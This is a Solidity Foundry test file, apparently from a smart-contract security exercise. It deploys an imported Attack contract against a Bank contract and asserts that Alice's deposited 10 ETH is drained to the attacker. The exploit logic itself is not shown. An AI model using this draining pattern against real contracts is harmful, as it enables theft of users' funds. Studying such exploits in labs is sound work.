// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import "forge-std/Test.sol";
import { Bank } from "../contracts/Bank.sol";
import { Attack } from "../contracts/Attack.sol";
import "forge-std/console.sol";

contract BankTest is Test {
    Bank public bank;
    address public alice = makeAddr("Alice");
    address public attacker = makeAddr("Attacker");

    function setUp() public {
        bank = new Bank();

        // mint 10 ETH to alice
        deal(alice, 10 ether);

        // mint 1 ETH to attacker
        deal(attacker, 1 ether);

        // alice deposit 10 ETH to contract
        vm.prank(alice);
        bank.deposit{ value: 10 ether }();
    }

    function test_attack() public {
        // 1. Deploy attack contract
        // 2. Exploit the bank
        
        vm.startPrank(attacker);
        Attack attack = new Attack(address(bank));
        (bool s,) = address(attack).call{ value: 1 ether }("");
        assertEq(s, true);

        attack.attack();
        vm.stopPrank();
        
        assertEq(address(attack).balance, 11 ether);
        assertEq(address(bank).balance, 0);
    }
}
